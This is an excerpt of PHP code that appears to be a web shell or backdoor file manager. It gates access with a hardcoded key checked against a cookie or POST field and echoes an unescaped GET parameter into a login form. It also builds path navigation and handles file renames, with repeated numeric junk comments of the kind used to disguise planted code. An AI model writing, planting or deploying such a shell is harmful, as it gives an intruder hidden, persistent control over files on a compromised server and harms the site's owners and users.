...
$auth_key = "38ae6ac03f53b85ba426edd9226e4fa0";
...
$pass = false;
if (isset($_COOKIE['pw_name_32881'])) {
    if(($_COOKIE['pw_name_32881']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_32881'])) {
        if(($_POST['pw_name_32881']) == $auth_key) {
            setcookie("pw_name_32881", $_POST['pw_name_32881']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_32881' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724018475187783 1724018475866504 1724018475464068 1724018475846929
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724018475187783 1724018475866504 1724018475464068 1724018475846929
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724018475187783 1724018475866504 1724018475464068 1724018475846929
            $name = PATH . "/" . $_GET['r'];
